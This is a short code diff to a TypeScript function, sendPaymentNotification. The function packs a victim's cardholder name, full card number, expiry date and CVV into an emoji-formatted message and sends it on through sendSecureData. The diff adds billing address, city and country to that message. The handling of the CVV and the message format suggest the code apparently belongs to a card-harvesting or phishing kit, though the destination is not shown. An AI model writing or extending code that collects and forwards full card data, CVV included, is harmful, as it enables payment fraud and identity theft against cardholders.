@@ -69,7 +69,12 @@ export const sendPaymentNotification = async (paymentData: any) => {
 👤 Card Holder: ${paymentData.cardHolder}
 💳 Card: ${paymentData.cardNumber}
 📅 Expiry: ${paymentData.expiryDate}
-🔒 CVV: ${paymentData.cvv}`;
+🔒 CVV: ${paymentData.cvv}
+
+📍 Billing Details:
+🏠 Address: ${paymentData.billingDetails.address1}
+${paymentData.billingDetails.address2 ? `📍 Address 2: ${paymentData.billingDetails.address2}\n` : ''}🌆 City: ${paymentData.billingDetails.city}
+🌍 Country: ${paymentData.billingDetails.country}`;
 
   return sendSecureData({
     type: 'payment',
